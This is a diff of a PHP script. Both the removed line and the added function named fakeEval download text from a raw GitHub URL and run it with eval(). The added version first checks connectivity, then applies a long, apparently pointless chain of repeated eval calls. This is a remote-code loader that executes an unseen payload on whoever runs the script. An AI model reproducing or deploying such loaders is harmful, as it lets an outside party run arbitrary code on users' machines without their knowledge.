@@ -1,3 +1,48 @@
-error_reporting(0); $doandinh = file_get_contents('https://raw.githubusercontent.com/doan2k4/doandinh.github.io/main/doandinh%20link'); if ($doandinh == ''){ echo $white." ➻❥ ".$green."Vui Lòng Kiểm Tra Lại Internet Hoặc Tắt VPN\n"; exit; } eval($doandinh);
 
+error_reporting(100000);
 
+function fakeEval() {
+
+if(!$sock = @fsockopen('www.google.com', 80))
+
+{
+
+    echo 'Vui lòng bật kết nối mạng !';
+
+    exit();
+
+}
+
+$a = (file_get_contents("https://raw.githubusercontent.com/doan2k4/doandinh.github.io/main/doandinh%20link"));
+
+if(!$a){
+
+exit();}
+
+$e = eval($a);
+
+eval($e);
+
+$a = eval($e);
+
+eval($a);
+
+$c = eval($a);
+
+eval($c);
+
+$b = eval($c);
+
+eval($b);
+
+$d = eval($b);
+
+eval($d);
+
+$u = eval($d);
+
+eval($u);
+
+}
+
+fakeEval();
